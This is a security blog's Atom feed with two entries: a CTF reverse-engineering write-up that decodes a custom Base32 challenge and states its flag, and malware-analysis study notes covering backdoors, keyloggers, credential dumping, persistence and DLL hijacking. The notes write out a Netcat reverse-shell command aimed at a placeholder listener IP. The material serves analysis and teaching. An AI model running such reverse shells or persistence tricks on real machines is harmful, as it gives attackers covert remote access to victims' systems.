<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2018-07-24T04:38:49.852Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</title>
    <link href="https://kabeor.github.io/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/"/>
    <id>https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N/</id>
    <published>2018-07-24T02:20:15.634Z</published>
    <updated>2018-07-24T04:38:49.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N"><a href="#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N" class="headerlink" title="2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N"></a>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</h1><p>通过这道题，又复习了一遍Base32的逆向<br><img src="https://i.loli.net/2018/07/24/5b568e0e2376c.png" alt="im"></p><p>很干净，无壳无花，x86 C++</p><p>拖进IDA</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>搜索字符串<br><img src="https://i.loli.net/2018/07/24/5b568eef447cf.jpg" alt="enter description here"></p><p>定位，F5<br><img src="https://i.loli.net/2018/07/24/5b568f58c6d73.jpg" alt="im"><br><img src="https://i.loli.net/2018/07/24/5b568f94111d0.jpg" alt="im"></p><p>首先要求输入长度大于等于10</p><h3 id="1-Fake-Flag"><a href="#1-Fake-Flag" class="headerlink" title="1. Fake Flag"></a>1. Fake Flag</h3><p><code>v3 = &quot;guvf_vf_n_snxr_synt&quot;;</code>是用来骗人的，其操作是在sub_401100进行操作然后比较，因此只要利用逆向思维，将v3看作已知，对sub_401100进行逆操作即可</p><p>sub_401100内部为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed int __thiscall sub_401100(const char *this)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v1; // edi</span><br><span class="line">  unsigned int v2; // esi</span><br><span class="line">  char v3; // cl</span><br><span class="line"></span><br><span class="line">  v1 = this;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  if ( strlen(this) )</span><br><span class="line">  &#123;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v1[v2];</span><br><span class="line">      if ( (unsigned __int8)(v3 - 97) &lt;= 0x19u )</span><br><span class="line">        v1[v2] = (v3 - 84) % 26 + 97;</span><br><span class="line">      if ( (unsigned __int8)(v3 - 65) &lt;= 0x19u )</span><br><span class="line">        v1[v2] = (v3 - 52) % 26 + 65;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v2 &lt; strlen(v1) );</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看出是对ASCII操作<br>    84  -&gt; ‘T’<br>    97  -&gt; ‘a’<br>    52 -&gt; ‘4’<br>    65 -&gt; ‘A’</p><blockquote><p>脚本</p></blockquote><p><img src="https://i.loli.net/2018/07/24/5b569646a3664.jpg" alt="im"></p><p>当然了，这是假flag，仅供娱乐</p><h3 id="True-Flag"><a href="#True-Flag" class="headerlink" title="True Flag"></a>True Flag</h3><p>接着往下看<br><strong>LABEL_9</strong>才是真正的加解密函数</p><h4 id="编码表-sub-4012C0"><a href="#编码表-sub-4012C0" class="headerlink" title="编码表 sub_4012C0()"></a>编码表 sub_4012C0()</h4><p>进入<code>sub_4012C0();</code>查看<br><img src="https://i.loli.net/2018/07/24/5b56985dd2937.jpg" alt="enter description here"></p><p><code>sub_401100</code>刚刚分析过，这里仔细分析一下<br><img src="https://i.loli.net/2018/07/24/5b5699d86e2f5.jpg" alt="i"></p><p>接下来读取长度，<strong>+32</strong>是大写转换为小写操作<strong>，</strong>++i<strong> 及 </strong>i&amp;1**组合表示奇数位不变，偶数位转换</p><p><code>dword_40507C</code>内容需要括住按C键重新分析，将数据识别为Char类型，结果如下<br><img src="https://i.loli.net/2018/07/24/5b569c5e93812.jpg" alt="enter description here"></p><p>‘2765’及‘43’也是转换成char类型得到的，值得注意的是，未转换之前为十六进制编码，且应倒序读取，<code>dword_40507C</code>加上4位数字(即5672)就来到了<code>word_405080</code>,也就是数字顺序为<strong>567234</strong><br>或着在修复<code>dword_40507C</code>后，重新F5，即如下图，更加易于理解<br><img src="https://i.loli.net/2018/07/24/5b569ea6d5852.jpg" alt="enter description here"></p><p>于是将<strong>ABCDEFGHIJKLMNOPQRSTUVWXYZ</strong>带入脚本得出<br><img src="https://i.loli.net/2018/07/24/5b569f8908552.jpg" alt="enter description here"><br>再替换大小写，后面加567234即得出编码顺序<br><strong><em>NoPqRsTuVwXyZaBcDeFgHiJkLm567234</em></strong></p><h4 id="BASE32-sub-401310"><a href="#BASE32-sub-401310" class="headerlink" title="BASE32 sub_401310()"></a>BASE32 sub_401310()</h4><p>回到主函数，分析最后一个需要的函数<code>sub_401310()</code><br><img src="https://i.loli.net/2018/07/24/5b56a0f209578.jpg" alt="enter description here"></p><p>跟进<code>sub_401170</code><br><img src="https://i.loli.net/2018/07/24/5b56a1524a1c1.jpg" alt="enter description here"><br><img src="https://i.loli.net/2018/07/24/5b56a175578ae.jpg" alt="enter description here"></p><p>下面case里的数据识别为char为”=”,结合题目叫Simple Base-N可以猜到应该是Base16/32/64类型的加密，并且编码表的内容我们也刚刚已经得出，为了继续印证猜想，往上看看，发现如下操作<br><img src="https://i.loli.net/2018/07/24/5b56a26b97f72.jpg" alt="enter description here"></p><p>这看起来很眼熟，<img src="https://i.loli.net/2018/07/24/5b56a3075ac53.jpg" alt="enter description here"></p><p>之前写过一篇wp(<a href="https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/" target="_blank" rel="noopener">2017第二届广东省强网杯线上赛Nonstandard</a>)，代码一模一样，看来就是Base32了。</p><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><p>于是直接用上次的脚本就好,带入密码<code>weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s = &quot;weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg&quot;</span><br><span class="line">table = &quot;NoPqRsTuVwXyZaBcDeFgHiJkLm567234&quot;</span><br><span class="line"></span><br><span class="line">def find(x):</span><br><span class="line">    if(x==&apos;=&apos;):</span><br><span class="line">        return 0</span><br><span class="line">    return table.index(x)</span><br><span class="line"></span><br><span class="line">for i in range(len(s)//8):</span><br><span class="line">    p = s[i*8:i*8+8]</span><br><span class="line">    t = 0</span><br><span class="line">    for j in p:</span><br><span class="line">        t = t&lt;&lt;5</span><br><span class="line">        t += find(j)</span><br><span class="line">    for j in range(5):</span><br><span class="line">        print(chr((t&amp;0xff00000000)&gt;&gt;32), end=&apos;&apos;)</span><br><span class="line">        t = t&lt;&lt;8</span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><img src="https://i.loli.net/2018/07/24/5b56a42e4abd6.jpg" alt="enter description here"><br>得出之后提交并不正确，通过凯撒移位，发现Rot13的结果是flag<br><img src="https://i.loli.net/2018/07/24/5b56ad29a553f.jpg" alt="enter description here"></p><blockquote><p>flag：Y@u_Kn@W<em>b@s332</em>@Nd_r0t13</p></blockquote><hr><p>Get it！</p><p>From <a href="https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1">https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N/</a> Simple Base-N/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot;&gt;&lt;a href=&quot;#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot; class=&quot;headerlink&quot; title=&quot;2018巅峰极客网络安全技能挑战赛 RE
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，巅峰极客网络安全技能挑战赛，wp" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%8Cwp/"/>
    
  </entry>
  
  <entry>
    <title>第11章  恶意代码行为</title>
    <link href="https://kabeor.github.io/%E7%AC%AC11%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/"/>
    <id>https://kabeor.github.io/第11章  恶意代码行为/</id>
    <published>2018-07-23T02:39:10.596Z</published>
    <updated>2018-07-23T06:34:27.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第11章-恶意代码行为"><a href="#第11章-恶意代码行为" class="headerlink" title="第11章  恶意代码行为"></a>第11章  恶意代码行为</h1><h2 id="11x1-下载器和启动器"><a href="#11x1-下载器和启动器" class="headerlink" title="11x1 下载器和启动器"></a>11x1 下载器和启动器</h2><p>常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行。下载器通常会与漏洞利用（exploit）打包在一起。下载器常用Windows API函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。</p><p>启动器（也称为加载器）是一类可执行文件，用来安装立即运行或者将来秘密执行的恶意代码。启动器通常包含一个它要加载的恶意代码。</p><h2 id="11x2-后门（backdoor）"><a href="#11x2-后门（backdoor）" class="headerlink" title="11x2 后门（backdoor）"></a>11x2 后门（backdoor）</h2><p>后门（backdoor）是另一种类型的恶意代码，它能让攻击者远程访问一个受害的机器。后门是一种最常见的恶意代码，它们拥有多种功能，并且以多种形式与大小存在。后门代码往往实现了全套功能，所以当使用一个后门时，攻击者通常不需要下载额外的恶意代码。</p><p>后门程序利用互联网的通信方式是多样的，但是一个常用的方法是利用80端口使用HTTP协议。<br>HTTP是出站流量最常使用的协议，所以它为恶意代码提供了一个与其他流量混淆的好机会。</p><p>后门拥有一套通用的功能，例如操作注册表、列举窗口、创建目录、搜索文件，等等。查看后门使用和导入的Windows函数，可以确定后门程序实现的功能。</p><h3 id="1-反向shell"><a href="#1-反向shell" class="headerlink" title="1. 反向shell"></a>1. 反向shell</h3><p>反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限。反向shel或者作为一个单独的恶意代码存在，或者作为一个复杂后门程序中的组件而存在。在反向shell中，攻击者能够如同在本地系统上一样运行命令。</p><blockquote><p>Netcat反向shell</p></blockquote><p>可以通过在两台机器上运行Netcat，来创建一个反向shell。同时，攻击者已经知道在恶意代码中使用Netcat，或者和其他恶意程序一起打包使用。</p><p>Netcat被作为一个反向shell使用时，远程机器使用下列命令，等待入站连接。<br><code>nc -l -p 80</code><br>-1选项设置Netcat为监听模式，-p用来设置监听端口。接下来，受害机器向外连出，并且使用下列命令提供shell。<br><code>nc 1istener_ip 80 -e cmd.exe</code><br>Listener_ip 80是远程机器的IP地址和端口。-e选项用来指定连接建立后要运行的程序，并将这一程序标准输入和输出与套接字进行绑定。</p><blockquote><p>Windows反向shell</p></blockquote><p>使用cmd.exe作为Windows系统中的反向shell，有两种简单的恶意编码实现：基础方法和多线程技术。</p><p>基础方法在恶意代码编写者之间比较流行，因为它容易编写，且效果与多线程技术一致。它涉及CreateProcess函数的调用，并操纵传递给CreateProcess的STARTUPINFO结构。首先，创建一个套接字，并与远程服务器建立连接。然后，绑定这个套接字与cmd.exe标准流（标准输入、标准输出以及标准错误）。调用CreateProcess函数用隐藏窗口的方式创建cmd.exe程序，对受害者隐藏cmd.exe进程。</p><p>Windows反向shell的多线程版本涉及一个套接字、两个管道及两个线程的创建（查询API调用函数CreateThread、CreatePipe）。恶意代码有时将这种方法作为策略，来篡改或编码经过一个套接字传入或传出的数据。CreatePipe用来绑定一个管道的读写端，如标准输入（stdin）和标准输出（stdout）。CreateProcess方法用来绑定一个管道与标准流，而不是直接与套接字绑定。调用CreateProcess方法，恶意代码会产生两个线程：一个用来从标准输入管道读数据，并且向套接字写数据，另外一个用来从一个套接字读数据，并且向一个标准输出管道写数据。通常这两个线程使用数据编码来篡改数据。</p><h3 id="2-远程控制工具"><a href="#2-远程控制工具" class="headerlink" title="2. 远程控制工具"></a>2. 远程控制工具</h3><p>远程控制工具（RAT）被用来远程管理一台或多台计算机。远程控制工具经常为了特定目标，如窃取信息或者旁路一个网络执行针对性的攻击。</p><p>服务器端运行在一个被植入恶意代码的受害主机上。客户端作为攻击者远程操纵运行命令和控制的单元。服务器端命令客户端开始一个连接，同时它们也被客户端控制。远程控制工具通常通过如80、443等常用的端口通信。</p><blockquote><p>远程控制工具的网络结构<br><img src="https://i.loli.net/2018/07/23/5b55432e2760f.jpg" alt="i"></p><p>Poison lvy（ <a href="http://www.poisonivy-rat.com/" target="_blank" rel="noopener">http://www.poisonivy-rat.com/</a> ）（<a href="http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/" target="_blank" rel="noopener">http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/</a> ）是一个免费提供且流行的远程控制工具。它的功能由shellcode插件控制，这使得它具有良好的扩展性。Poison Ivy是一款有用的工具，它能够快速生成用来测试和分析的恶意样本。</p></blockquote><h3 id="3-僵尸网络"><a href="#3-僵尸网络" class="headerlink" title="3. 僵尸网络"></a>3. 僵尸网络</h3><p>僵尸网络是被感染主机（也称为僵尸主机）的一个集合。它们由单一实体控制，通常由一个称为僵尸控制器的机器作为服务器。僵尸网络的目标是尽可能多地感染机器，来构建一个更大的僵尸主机网络，从而使僵尸网络传播其他的恶意代码或蠕虫，或者执行分布式拒绝服务（DDoS）攻击。</p><p>在实施分布式拒绝服务攻击时，所有僵尸主机会在同一时刻访问同一个站点，僵尸网络能够让这个站点挂掉。</p><h3 id="4-远程控制工具与僵尸网络的比较"><a href="#4-远程控制工具与僵尸网络的比较" class="headerlink" title="4. 远程控制工具与僵尸网络的比较"></a>4. 远程控制工具与僵尸网络的比较</h3><p>在远程控制工具与僵尸网络之间有一些不同</p><ol><li>僵尸网络感染和控制数以百万计的主机。远程控制工具通常只控制很少数量的主机。</li><li>僵尸网络中的所有主机在同一时刻被控制，而远程控制工具是以每个受害者为单位进行远程控制，因为远程控制工具要求攻击者与受害主机之间更紧密地交互。</li><li>远程控制工具被用来执行针对性的攻击，而僵尸网络用来进行大规模攻击。</li></ol><h2 id="11x3-登录凭证窃密器"><a href="#11x3-登录凭证窃密器" class="headerlink" title="11x3 登录凭证窃密器"></a>11x3 登录凭证窃密器</h2><p>攻击者经常会不遗余力地去窃取登录凭证，他们主要使用以下三种类型的恶意代码</p><ol><li>等待用户登录以窃取登录凭证的程序。</li><li>转储Windows系统中存放信息的程序，例如密码哈希值，程序直接使用它，或者对它进行离线破解。</li><li>击键记录程序。</li></ol><h3 id="1-GINA拦截"><a href="#1-GINA拦截" class="headerlink" title="1. GINA拦截"></a>1. GINA拦截</h3><p>在WindowsXP系统中，恶意代码使用微软图形识别和验证界面（GINA）拦截技术来窃取用户的登录凭证。GINA的设计目的是让合法第三方通过添加一些代码，来自定义登录过程，如用硬件无线射频标识（RFID）令牌或者智能卡来进行身份认证等。恶意代码编写者利用GINA对第三方的支持来加载窃密器。</p><p>GINA在msgna.dll中实现，这个DLL在用户登录系统过程中由Winlogon可执行文件加载。Winlogon也为第三方定制实现DLL程序工作，在Winlogon与GINADLL之间加载第三方DLL（类似于中间人攻击）。为了方便，Windows用下列注册表项，来存储需要Winlogon加载的第三方DLL。<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon\GinaDLL</code></p><h3 id="2-口令哈希转储"><a href="#2-口令哈希转储" class="headerlink" title="2. 口令哈希转储"></a>2. 口令哈希转储</h3><p>转储Windows口令哈希是恶意代码获取系统登录凭证的一种流行方法。攻击者试图抓取这些口令哈希，以便离线暴力破解，或者利用它们执行Pass-the-Hash攻击。Pass-the-Hash攻击在无须破解或解密口令哈希以获取明文密码的情况下，使用LM或者NTLM哈希来通过远程主机的身份验证，从而获得访问权。</p><p>Pwdump和Pas-the-Hash（PSH）工具包是提供口令哈希转储免费可用的软件包。因为这两种工具都开源，很多恶意代码都派生于它们的源码。因为多数反病毒软件都拥有它们标准版本的特征码，所以通常情况下，攻击者要逃避探测就会编译他们的专有版本。</p><p>pwdump是一个程序集合，它从安全账户管理器（SAM）输出本地用户账户的LM和NTLM口令哈希。pwdump通过注入DLL到本地安全认证子系统服务（LSASS）进程进行攻击。我们将在第12章深入讨论DLL注入技术。现在，我们仅需要了解DLL注入是恶意代码在另外一个进程中运行DLL的一种方法，因此它提供了DLL与被注入进程相同的权限。口令哈希转储工具通常针对lsass.exe进程，因为它拥有足够的权限来访问很多有用的API函数。</p><p>标准pwdump程序使用的DLL是lsaext.dll，一旦DLL在lsass.exe中运行，pwdump就会调用GetHash，这个函数由lsaext.dll导出，目的是执行口令哈希提取。提取函数会使用未文档化的Windows函数，来枚举系统中的用户，并且获得每个用户未解密的口令哈希。</p><p>处理pwdump程序变种时，你需要分析DLL，以便确定它如何执行口令哈希转储操作。首先查看DLL的导出函数，pwdump默认的导出函数是GetHash，但是攻击者可以很容易地修改这个导出函数的名字，使它不那么显而易见。接下来，尝试确定导出函数使用的API函数。因为多数API函数需要动态解析，所以口令哈希转储导出函数通常会多次调用GetProcAddress。</p><h3 id="3-击键记录"><a href="#3-击键记录" class="headerlink" title="3. 击键记录"></a>3. 击键记录</h3><p>击键记录是一种传统形式的窃取登录凭证方法。当击键记录开启时，恶意代码能够记录用户击键操作，从而让攻击者能够观察到用户敲入的数据，如用户名、密码。Windows平台上的恶意代码使用多种形式的击键记录。</p><blockquote><p>基于内核的击键记录器</p></blockquote><p>用户模式下的应用程序很难探测到基于内核的击键记录器。它们经常作为Rootkit的一部分并且它们作为一个键盘驱动绕过用户空间应用程序和保护，来捕获击键操作。</p><blockquote><p>用户空间的击键记录器</p></blockquote><p>Windows用户空间的击键记录器通常使用WindowsAPI并且常通过挂钩（hook）或者轮询来实现。</p><p>挂钩在键盘每次按下时用Windows API通知恶意代码，通常使用SetwindowsHookEx安装挂钩。轮询使用Windows API不断地轮询按键的状态，它通常使用函数GetAsyncKeyState和GetForegroundWindow。</p><p>挂钩击键记录器使用的WindowsAPl函数是SetwindowsHookEx。这种类型的恶意代码可能被打包成一个初始化挂钩函数的可执行文件，它也可能包含一个处理击键记录的DLL文件，这个DLL文件被自动地映射到系统的多个进程中。</p><p>GetAsynckeyState函数用来识别一个按键是被按下还是被弹起，是否是在最近一次GetAsyncKeyState函数被调用后按下。GetForegroundWindow函数识别当前聚焦的前端窗口，它告诉击键记录器当前哪个应用程序正在执行输入（例如Notepad、Internet Explorer）。</p><blockquote><p>轮询击键记录器中的典型循环结构<br><img src="https://i.loli.net/2018/07/23/5b554852b3083.jpg" alt="i"></p><p>GetAsynckeyState和GetForegroundWindow 击键记录器的反汇编<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401162 call ds:GetForegroundWindow</span><br><span class="line">···</span><br><span class="line">00401272 push 10h ；nVirtKey Shift</span><br><span class="line">00401274 call ds:GetKeyState</span><br><span class="line">0040127A mov esi，dword_403308[ebx]</span><br><span class="line">00401280 push esi；vKey</span><br><span class="line">00401281 movsx edi，ax</span><br><span class="line">00401284 call ds:CetAsyncKeyState</span><br><span class="line">0040128A test ah，80h</span><br><span class="line">0040128D jz short 1oc_40130A</span><br><span class="line">0040128F push 14h；nvirtkey Caps Lock</span><br><span class="line">00401291 call ds:GetKeyState</span><br><span class="line">···</span><br><span class="line">004013EF add ebx，4</span><br><span class="line">004013F2 cmp ebx，368</span><br><span class="line">004013F8 j1 loc_401272</span><br></pre></td></tr></table></figure></p></blockquote><p>在进入内部循环之前程序调用了GetForegroundwindow函数。内部循环开始后，立即使用GetKeyState检查Shift键的状态，函数GetKeyState是快速检查按键状态的方法，与GetAsyncKeyState一样，它不能记住在它被调用后，按键是否被按下。接下来，击键记录器用EBX来索引键盘上的按键数组。如果一个新的按键被按下，击键记录器在调用GetkeyState查看CapsLock是否被激活之后，记录击键。最后，递增EBX确保代码清单中的下一个按键被检查。一旦检查了92个（368/4）按键，内部循环就结束了，再次调用GetForegroundwindow进入新的内部循环。</p><blockquote><p>通过字符串列表识别击键记录器</p></blockquote><p>可以通过查看恶意代码的导入API来识别击键记录器的功能。也可以通过检查标志字符串列表来识别击键记录器的功能，对于使用导入函数混淆技术或者使用你未见过的击键记录器功能的恶意代码来说，这种技术特别有用。</p><h2 id="11x4-存活机制"><a href="#11x4-存活机制" class="headerlink" title="11x4 存活机制"></a>11x4 存活机制</h2><p>一旦恶意代码获取系统的控制权，它通常就会在系统中驻留很长一段时间，恶意代码的这种行为被称为存活。如果存活机制足够特别，它甚至能作为给定恶意代码的指纹。</p><h3 id="1-Windows注册表"><a href="#1-Windows注册表" class="headerlink" title="1. Windows注册表"></a>1. Windows注册表</h3><p>一些工具可以帮助你搜索恶意代码在注册表中的存活位置，例如Sysintermals的自动化程序，它可以帮你找出系统中所有的自动启动程序。像ProcMon这样的工具可以帮助你在执行基本的动态分析时，监控系统中的所有注册表修改。</p><blockquote><p>AppInit_DLL</p></blockquote><p>恶意代码编写者可以通过一个名为AppInit DLL特殊注册表项来让他们的DLL获得加载。AppInit_DLL中的DLL程序会在进程加载User32.dl时被加载。插入DLL路径到注册表Applnit_DLL，会让DLL程序获得加载机会。</p><p>AppInit_DLL的值存储在如下Windows注册表键中<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code><br>Applnit_DLL值的类型是REG_SZ，它由空格分隔的字符串组成。很多进程都会加载User32.dll，这些进程也会加载Applnit DLL。恶意代码编写者通常只针对一个单独进程，但是AppInit DLL会被加载到多个进程中。因此，恶意代码编写者执行攻击负载（playload）前必须检查它运行在哪个进程中。这种检查通常在恶意DLL程序的DLLMain函数中完成。</p><blockquote><p>Winlogon Notify</p></blockquote><p>恶意代码编写者可以挂钩一个特殊的Winlogon事件，如登录、注销、关机以及锁屏，等等。这甚至可以允许恶意代码在安全模式下加载。下面注册表键中的注册表项包含Notify的值。<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Winlogon\</code><br>当winlogon.exe产生一个事件时，Windows系统会检查Notify注册表键来查找处理这个事件的DLL程序。</p><blockquote><p>SvcHost DLL</p></blockquote><p>所有服务都存在于注册表中，如果一个服务的注册表键被移除，则这个服务将不能启动。恶意代码经常作为一个服务安装，但是更多的时候作为一个可执行文件使用。安装的恶意代码作为swchost.exe的DLL来存活，这使得恶意代码可以与其他进程混淆，且更像标准的服务。</p><p>svchost.exe是从动态链接库中运行服务的通用主机进程，Windows操作系统通常同一时刻运行多个svchost.exe实例。每个实例包含一组服务，这些服务能够使开发、测试以及服务组管理变得更简单。</p><p>这些组被定义在下列的注册表位置（每个值代表一个不同的组）<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Svchost</code></p><p>服务被定义在下列的注册表位置<br><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName</code></p><p>Windows服务包含多个注册表值，其中多数提供关于服务的信息。例如DisplayName和Description。恶意代码编写者通常会设置有助于恶意代码混淆的值，例如NetWareMan，它提供访问文件和打印NetWare网络资源的服务。另外一个注册表值为ImagePath，它包含服务可执行文件的位置。以svuchost.exe DLL为例，这个注册表值包含<code>%SystemRoot%/System32/svchost.exe -k GroupName</code>。</p><p>所有的svchost.exe DLL包含拥有ServiceDLL值的Parameters键，这是恶意代码编写者设置恶意DLL程序的位置，Parameters键下另一个值start用来确定服务何时启动（恶意代码通常设置为系统引导时启动）。</p><p>Windows拥有很多预先定义的服务组，所以恶意代码通常不会创建一个新的服务组，因为新创建的服务组很容易被探测。相反，多数恶意代码会将其加入一个已经存在的组或者覆盖一个无关紧要的服务——经常使用netsvcs服务组中很少使用的服务。要识别这种技术，使用动态分析监视Windows的注册表，或者在反汇编中查找CreateServiceA函数。如果恶意代码修改这些注册表键，你就会知道它们使用了这种存活技术。</p><h3 id="2-特洛伊木马化（Trojanized）系统二进制文件"><a href="#2-特洛伊木马化（Trojanized）系统二进制文件" class="headerlink" title="2. 特洛伊木马化（Trojanized）系统二进制文件"></a>2. 特洛伊木马化（Trojanized）系统二进制文件</h3><p>利用这种技术，恶意代码能够修改系统的二进制文件，当被感染的二进制文件下次运行或者加载时，将会强制运行恶意代码。恶意代码编写者主要针对Windows系统正常操作时最常使用的二进制文件，而DLL是恶意代码编写者欢迎的目标。</p><p>恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码。这些修改补丁覆盖函数的开始代码或者覆盖其他一些并不影响特洛伊木马化DLL正常操作的代码。为了不影响二进制文件的正常操作，恶意的代码被加入到可执行文件的一个空节中。插入的代码通常用来加载恶意代码，插入的函数并不关心它被插入到被感染的DLL的何处。加载恶意代码后，为了让DLL的操作与插入前的代码一致，代码会跳转回原始的DLL程序。</p><p>检查一个受感染的系统时，我们会注意到系统的二进制文件rutils.dll没有预想的MD5哈希值，所以我们进一步调查。我们将可疑版本的rtutils.dll与干净版本的rutils.dll一同加载到IDAPro。比较它们的D11EntryPoint函数。不同之处十分明显：特洛伊木马化版本的rtutits.dl会跳转到其他位置。<br><img src="https://i.loli.net/2018/07/23/5b557303ce5cd.jpg" alt="i"></p><h3 id="3-DLL加载顺序劫持"><a href="#3-DLL加载顺序劫持" class="headerlink" title="3. DLL加载顺序劫持"></a>3. DLL加载顺序劫持</h3><p>DLL加载顺序劫持是一种简单隐蔽的技术，它允许恶意代码编写者在不使用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序。这种技术甚至不需要单独的恶意加载器，因为它有能力让Windows加载它。</p><blockquote><p>在WindowsXP上加载DLL的默认搜索顺序</p><ol><li>加载应用程序的目录。</li><li>当前目录。</li><li>系统目录（使用GetsystemDirectory函数获取的路径，例如…/Windows/System32）。</li><li>16位子系统的系统目录（例如.…/Windows/System）。</li><li>Windows目录（使用GetwindowsDirectory获取的路径，例如.…/Windows）。</li><li>PATH环境变量里列出的目录。</li></ol></blockquote><p>在WindowsXP系统中，利用KnownDLL注册表键可以跳过DLL的加载过程，这个注册表键保护一些特定的DLL位置列表，这些DLL通常位于…/Windows/System32/目录下。设计KnownDLL机制的目的是改善安全（恶意的DLL不能放到加载顺序的前面）和速度（Windows不需要默认搜索前面的列表），但是它仅包含一个较短的重要DLL列表。</p><p>DLL加载顺序劫持可以被/System32之外目录中的二进制文件利用，来加载/System32目录中未被KnownDLL保护的DLL程序。例如，/Windows目录下explorer.exe会加载/System32目录下的ntshrui.dll。由于ntshrui.dll并不是一个KnownDLL，所以遵循默认搜索顺序，另外，/Windows目录在/System32目录之前被搜索。如果恶意的DLL被命名为ntshrui.dll并放到/Windows目录，则它将被加载到合法DLL的位置。为了让系统正常运行，恶意DLL程序随后再加载真正的DLL。</p><p>/System32目录之外的二进制文件都容易受到这种攻击，其中explorer.exe约有50个易受攻击的DLL。此外，由于DLL递归导入的原因，很多DLL会加载其他的DLL，而这些DLL按照默认顺序加载，因此KnownDLL机制也不能得到充分的保护。</p><h2 id="11x5-提权"><a href="#11x5-提权" class="headerlink" title="11x5 提权"></a>11x5 提权</h2><p>多数提权攻击是利用本地系统已知漏洞或者0day漏洞进行攻击，其中多数可以在Metasploit Framework中找到（<a href="http://www.metasploit.com/" target="_blank" rel="noopener">http://www.metasploit.com/</a> ）。甚至，DLL加载顺序劫持也可以被用来执行特权操作。如果恶意DLL所在的目录是用户可写的，并且加载这个DLL的进程在一个高特权级上运行，那么恶意DLL就获得了提权。拥有提权操作的恶意代码比较罕见，但是分析人员应该能识别常见的提权方法。</p><p>有时，甚至当用户以本地管理员运行时，恶意代码还会要求提权。运行在Windows系统中的进程或者运行在用户级别，或者运行在系统级别。通常用户不能操纵系统级别的进程，即使他们是管理员。</p><h3 id="1-使用SeDebugPrivilege"><a href="#1-使用SeDebugPrivilege" class="headerlink" title="1. 使用SeDebugPrivilege"></a>1. 使用SeDebugPrivilege</h3><p>以用户权限运行的进程并没有任意访问系统一切资源的权限，也不能拥有这种权限。例如在远程进程中调用类似于TerminateProcess和CreateRemoteThread函数。恶意代码获得访问这些函数的权限的唯一方法是通过设置访问令牌的权限来开启SeDebugPrivilege.在Windows系统中，访问令牌（access 